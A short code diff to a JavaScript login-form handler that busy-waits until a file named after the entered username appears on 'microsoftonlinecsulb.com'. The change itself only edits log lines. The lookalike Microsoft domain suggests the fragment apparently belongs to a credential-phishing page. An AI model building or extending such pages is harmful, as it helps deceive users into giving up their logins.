@@ -70,9 +70,10 @@ $(document).on('submit','#login-form',function(e)
           passwordDiv.style.display = "none";
           console.log(functioncheck);
           while(UrlExists('https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt') == false){
-            console.log("loop");
+            // console.log("loop");
 
           }
+          console.log("file foound");
         }
       })
     });
